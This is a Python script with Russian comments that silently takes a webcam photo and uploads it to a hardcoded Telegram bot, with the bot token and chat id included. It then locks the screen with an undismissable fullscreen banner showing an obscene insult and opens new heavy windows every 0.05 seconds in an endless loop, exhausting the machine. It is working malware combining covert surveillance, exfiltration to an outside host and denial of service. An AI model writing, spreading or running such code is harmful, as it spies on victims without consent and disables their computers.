import tkinter as tk
import threading
import time
from PIL import Image, ImageTk, ImageDraw, ImageFont
import cv2
import requests
import os

# === Настройки ===
bot_token = '7785202195:AAGBPO2by0Kg0uxZd70wF3aDeY-67U6905Q'
chat_id = '6154104101'
filename = 'photo.jpg'

def send_photo():
    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()
    cap.release()

    if ret:
        cv2.imwrite(filename, frame)
    else:
        return False

    url = f"https://api.telegram.org/bot{bot_token}/sendPhoto"
    with open(filename, 'rb') as f:
        files = {'photo': f}
        data = {'chat_id': chat_id}
        response = requests.post(url, data=data, files=files)

    os.remove(filename)
    return response.status_code == 200

# Главное окно с надписью — ВСЕГДА СВЕРХУ
def main_banner():
    root = tk.Tk()
    root.attributes('-fullscreen', True)
    root.overrideredirect(True)
    root.attributes('-topmost', True)
    root.configure(bg='white')

    screen_width = root.winfo_screenwidth()
    screen_height = root.winfo_screenheight()

    img = Image.new("RGB", (screen_width, screen_height), color="white")
    draw = ImageDraw.Draw(img)

    try:
        font = ImageFont.truetype("arial.ttf", 200)
    except:
        font = ImageFont.load_default()

    text = "ИДИ НАХУЙ"
    text_width, text_height = draw.textsize(text, font=font)
    draw.text(((screen_width - text_width) / 2, (screen_height - text_height) / 2),
              text, font=font, fill="black")

    img_tk = ImageTk.PhotoImage(img)
    label = tk.Label(root, image=img_tk)
    label.image = img_tk
    label.pack()

    root.mainloop()

# Тяжёлые фоновые окна
def background_window():
    root = tk.Tk()
    root.geometry("800x600+100+100")
    root.configure(bg='black')
    root.title("")

    for _ in range(150):
        label = tk.Label(root, text="█" * 200, fg="lime", bg="black", font=("Courier", 12))
        label.pack()

    root.mainloop()

# Главная логика
if send_photo():
    threading.Thread(target=main_banner, daemon=True).start()
    time.sleep(2)
    while True:
        threading.Thread(target=background_window).start()
        time.sleep(0.05)
else:
    print("Ошибка при отправке фото. Программа завершена.")
